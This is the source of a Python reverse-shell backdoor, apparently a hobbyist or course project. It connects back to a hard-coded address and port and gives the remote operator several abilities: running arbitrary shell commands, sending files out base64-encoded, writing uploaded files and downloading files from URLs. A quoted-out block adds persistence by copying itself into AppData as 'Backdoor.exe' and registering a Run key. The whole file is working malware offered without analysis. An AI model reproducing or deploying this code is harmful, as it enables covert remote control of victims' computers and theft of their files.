#!/usr/bin/python
import socket
import subprocess
import json
import os
import shutil
import sys
import time
import base64
import requests

def nam_send(data):
    json_data = json.dumps(data)
    ramimalek.send(json_data)

def nam_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + ramimalek.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            ramimalek.connect(("192.168.100.12", 54321))
            shell()
        except:
            connection()

def shell():
    while True:
        command = nam_recv()
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                nam_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = nam_recv()
                fin.write(base64.b64decode(result))
        elif command[:3] == "get":
            try:
                download(command[4:])
                nam_send("[+] Download File From Specified URL!")
            except:
                nam_send("[!!] Failed To Download File")
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                nam_send(result)
            except:
                nam_send("[!!] Can't Execute That Command")
"""
location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
"""
ramimalek = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
ramimalek.close()

